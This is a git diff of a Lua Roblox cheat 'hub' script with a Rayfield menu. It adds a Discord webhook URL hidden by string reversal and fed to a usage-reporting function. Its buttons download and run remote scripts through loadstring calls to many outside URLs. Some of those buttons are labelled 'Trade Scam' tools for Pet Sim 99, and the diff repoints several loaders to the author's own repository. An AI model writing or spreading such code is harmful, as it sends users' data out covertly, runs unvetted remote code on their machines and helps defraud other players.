@@ -62,9 +62,7 @@ local function makeHttpRequest(options)
     return {Success = false, StatusCode = 500}
 end
 
--- Webhook moved to key_syem.lua for security
-local KeySystem = loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/key_syem.lua") or readfile("key_syem.lua"))()
-local DISCORD_WEBHOOK_URL = KeySystem.get_webhook()
+local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
 
 local function sendUsageData()
     local success, error_message = pcall(function()
@@ -164,7 +162,7 @@ local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
 local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
 local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
--- Universal tab removed as requested
+local Universal = Window:CreateTab("Universal", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
 
 local function executednotify(scriptName)
@@ -256,136 +254,6 @@ BlueLock:CreateButton({
    end,
 })
 
--- Dead Rails Tab
-DeadRails:CreateButton({
-   Name = "Markk Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
-       executednotify("Markk Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Farx11122 Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
-       executednotify("Farx11122 Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "SpiderXHub Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
-       executednotify("SpiderXHub Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Strelizia Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
-       executednotify("Strelizia Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Rinns Dead Rails No Key",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
-       executednotify("Rinns Dead Rails No Key")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Auto Farm Bond",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
-       executednotify("Auto Farm Bond")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Lomu Hub",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
-       executednotify("Lomu Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Neox Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
-       executednotify("Neox Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Sypher Hub OP",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
-       executednotify("Sypher Hub OP")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
-       executednotify("Tbao Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Karol Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
-       executednotify("Karol Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Dead Rails Alpha Script",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
-       executednotify("Dead Rails Alpha Script")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Airflow UPDATED",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Null-Fire Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
-       executednotify("Null-Fire Keyless")
-   end,
-})
-
--- Blox Fruits Tab (Updated)
-BloxFruits:CreateButton({
-   Name = "REDz Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
-       executednotify("REDz Hub")
-   end,
-})
-
--- Pet Sim 99 Tab with the new Trade Scam (only the one you requested)
-PetSim99:CreateButton({
-   Name = "Trade Scam",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
-       executednotify("Trade Scam")
-   end,
-})
 
 PetSim99:CreateButton({
    Name = "LAJ Trade Scam (Custom)",
@@ -395,19 +263,54 @@ PetSim99:CreateButton({
        executednotify("LAJ Custom Trade Scam")
    end,
 })
-
--- Rivals Tab
-Rivals:CreateButton({
-   Name = "COOMING soon",
+Universal:CreateButton({
+   Name = "Infinite Yield FE",
    Callback = function()
-       Rayfield:Notify({
-           Title = "COOMING soon",
-           Content = "Rivals scripts will be added in future updates!",
-           Duration = 3,
-           Image = 4483362458,
-       })
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+       executednotify("Infinite Yield")
    end,
 })
+
+Universal:CreateButton({
+   Name = "Dex Explorer",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
+       executednotify("Dex Explorer")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Hydroxide",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
+       executednotify("Hydroxide")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "SimpleSpy",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+       executednotify("SimpleSpy")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "CMD-X Admin",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
+       executednotify("CMD-X Admin")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Domain X",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
+       executednotify("Domain X")
+   end,
+})
+
 
 -- Settings Tab
 local idled_Connection
@@ -458,4 +361,46 @@ print("1. Full Swift compatibility")
 print("2. Pet Sim 99 Tab with new Trade Scam V2")
 print("3. All scripts updated to work with Swift")
 print("4. Improved executor detection")
+
+-- Rivals Tab
+Rivals:CreateSection("Rivals Scripts")
+
+Rivals:CreateButton({
+   Name = "Coming Soon",
+   Callback = function()
+       Rayfield:Notify({
+           Title = "Rivals Scripts",
+           Content = "Scripts for this game are coming soon!",
+           Duration = 3,
+           Image = 4483362458,
+       })
+   end,
+})
+
+-- Dead Rails Tab
+DeadRails:CreateSection("Dead Rails Scripts")
+
+DeadRails:CreateButton({
+   Name = "Markk Keyless",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/markktest"))()
+       executednotify("Markk Keyless Script")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Farx11122 Keyless",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/farx11122test"))()
+       executednotify("Farx11122 Keyless Script")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "SpiderXHub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadrailsscript/refs/heads/main/SpiderXhub"))()
+       executednotify("SpiderXHub Script")
+   end,
+})
 
